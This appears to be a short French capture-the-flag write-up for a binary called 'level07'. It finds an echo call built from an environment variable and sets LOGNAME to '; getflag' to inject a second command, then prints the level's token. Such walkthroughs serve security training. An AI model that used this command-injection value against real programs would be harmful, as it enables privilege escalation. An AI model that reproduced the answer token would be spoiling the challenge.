# level07

1) Fichier binaire `level07` à la racine.

    - Exécution : 

```bash
./level07
```

2) Analyse du binaire avec strings
```bash
strings level07
```
- Une ligne retient notre attention :

```bash
/bin/echo %s 
```

- Le script affiche donc une variable qui se nomme `level07`, nous allons donc grep toutes les variables d'environnement qui se nomment `level07`, et deux sont retenues : 
```bash
USER=level07
LOGNAME=level07
```

3) Nous allons donc les renommer de façon à échapper la commande echo et ajouter une deuxième commande à la suite, qui serait `getflag`
```bash
LOGNAME=; getflag
```
4) Pour finir, nous allons exécuter `./level07` afin d'exécuter la commande `echo` prévue de base puis `; getflag`.
```bash
echo $LOGNAME; getflag
```

5) Token découvert :

Le token est `fiumuikeil55xe9cu4dood66h`.
